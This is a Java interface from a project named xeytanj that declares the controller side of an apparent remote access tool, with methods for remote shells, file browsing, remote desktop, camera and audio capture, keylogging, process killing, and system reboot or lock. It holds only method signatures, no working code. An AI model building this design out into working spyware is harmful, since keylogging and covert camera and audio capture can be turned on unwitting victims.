package com.melardev.xeytanj.services.net;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.MediaState;
import com.melardev.xeytanj.enums.NetworkProtocol;
import com.melardev.xeytanj.enums.ProcessInfoDetails;
import com.melardev.xeytanj.models.Client;
import com.melardev.xeytanj.models.FileInfoStructure;
import com.melardev.xeytanj.net.packets.PacketPresentation;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;
import com.melardev.xeytanj.services.IService;
import com.melardev.xeytanj.services.config.IConfigService;
import com.melardev.xeytanj.services.logger.ILogger;

import java.util.ArrayList;
import java.util.UUID;

public interface INetworkServerService extends IService {


    // ===========================
    // Server related
    // ===========================

    void setConfig(IConfigService configService);

    void initServer();

    void stopServer();

    // ===========================
    // Client related
    // ===========================

    void sendShellCommand(Client client, String command);

    void getClientInfo(UUID uuid);

    ArrayList<Client> getAllClients();

    void startFileManager(UUID uuid);

    void startRemoteDesktop(UUID uuid);

    void startListProcess(ProcessInfoDetails level, UUID uuid);

    void startChat(UUID uuid);

    void onChatClosed(UUID uuid);

    void startShellSession(UUID uuid);

    void startAudioRecording(UUID uuid, PacketVoice.Mode dataType);

    void startRebootSystem(UUID uuid);

    void startShutDownSystem(UUID uuid);

    void startLogOffSystem(UUID uuid);

    void startLockSystem(UUID uuid);

    void startTurnDisplay(UUID uuid, boolean on);

    void startKeyloggerSession(UUID uuid);

    // =================================
    // callbacks triggered from Client
    // =================================
    void onClientLoginFail(INetworkClientService networkClientService);

    void setApplication(IApplication application);

    void onPresentationData(UUID uuid, PacketPresentation packet);


    boolean isClientStreamingDesktop(Client client);

    void pauseRemoteDesktop(Client client);

    void playRemoteDesktop(Client client, NetworkProtocol networkProtocol, String displayName, int delay, int scaleX, int scaleY);

    void stopRemoteDesktop(Client client);

    MediaState getDesktopMediaState(Client client);

    void onCameraSessionClosed(UUID uuid);

    void playRemoteCamera(NetworkProtocol protocol, Client client, int cameraId, boolean muteAudio, int interval);

    void onFilesystemRootInfoReceived(UUID uuid, FileInfoStructure[] fileInfoStructures);

    void getFileSystemView(Client client, String fileSystemPath);

    void killProcess(Client client, int pid);

    void stopProcessMonitor(Client client);

    void onProcessSessionClosed(UUID uuid);

    void startCameraSession(NetworkProtocol networkProtocol, UUID uuid);

    void pauseCameraStreaming(Client client);

    void stopCameraSession(Client client);

    void sendChatMessage(Client client, String text);

    void setLogger(ILogger logger);

    void stopShellSession(Client client);

    RemoteClient getRemoteClientFromClientId(UUID id);

    void requestUninstallServer(Client remoteClient);

    void closeConnection(UUID uuid);
}
